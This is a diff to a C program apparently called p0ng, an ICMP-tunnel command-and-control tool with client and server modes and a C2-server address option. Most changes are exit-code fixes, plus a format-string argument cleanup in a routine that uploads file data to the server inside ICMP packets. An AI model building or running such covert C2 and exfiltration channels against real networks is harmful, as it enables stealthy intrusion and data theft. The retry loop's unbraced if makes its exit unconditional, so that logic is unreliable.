@@ -217,7 +217,7 @@ void check_server(uint8_t seq_num){
     sendpacket_size = p0ng_pack(sendpacket,seq_num,ICMP_ECHO,icmpdata,icmp_data_len);//@todo 后期考虑怎么加密payload
     if(sendto(sockfd, sendpacket, sendpacket_size, 0, (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0){
         printf("\033[40;31m[-]\033[0mcheck server send error!\n");
-        exit(0);
+        exit(1);
     }
     //signal(SIGALRM, handler);
     //alarm( 5 ); 
@@ -227,11 +227,11 @@ void check_server(uint8_t seq_num){
     setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO , &timeval_old, sizeof(struct timeval));
     if (recv_pkt_size==-1) {
         printf("Connect timeout!\n");
-        exit(0);
+        exit(1);
     }
     
     if (p0ng_pkt_basicchk(recvpacket, recv_pkt_size, sendpacket, sendpacket_size)) {/*正常为0*/
-        exit(0);
+        exit(1);
     }
 
 }
@@ -543,7 +543,7 @@ void do_upload_task(){
         memcpy(send_icmp->icmp_data,recv_icmp->icmp_data,ICMP_DATA_PRESERVE);
         //拷贝 文件数据到p0ng的核心数据区，前面4字节是状态控制字。
         (void)snprintf(pkt2send + ICMPHDR_LEN + ICMP_TIMESTAMP_LEN +  ICMP_DATA_PRESERVE,
-               ICMP_DATA_LEN-8, "%c%c%c%c", ICMP_UPLOAD_RESULT, not_ok, seq_id, (uint8_t)strlen(data2send), ret );
+               ICMP_DATA_LEN-8, "%c%c%c%c", ICMP_UPLOAD_RESULT, not_ok, seq_id, ret );
 	    memcpy(pkt2send+ ICMP_TIMESTAMP_LEN + ICMPHDR_LEN + ICMP_DATA_PRESERVE+4, data2send, sizeof(data2send)-1);
         //ICMP头校验
         send_icmp->icmp_cksum = cal_chksum((uint16_t *) send_icmp, pack_size);
@@ -646,7 +646,7 @@ void p0ng_client(char *server_ip){
             times++;
             if(times==MAX_RETRY_TIMES)
                 printf("p0ng PROTOCOL INTERNAL ERROR!\n");
-                exit(0);
+                exit(1);
             continue;
         }
         count++;
@@ -782,12 +782,11 @@ int main(int argc, char *argv[]){
         switch(opt)
         {
             case 'h':
-                printf("stub for show help!\n");
                 printf("-C client-mode\n");
                 printf("-S Server-mode\n");
                 printf("-s [IP] configure c2-server address\n");
                 printf("-h show usage\n");
-                break;
+                exit(0);
             case 'q':
                 debug=0;
                 verbose=0;
@@ -807,7 +806,7 @@ int main(int argc, char *argv[]){
         }
     }
     if((btn_s^btn_c)==0){
-        exit(0);
+        exit(1);
     }
     if(btn_s){
         p0ng_c2_main();
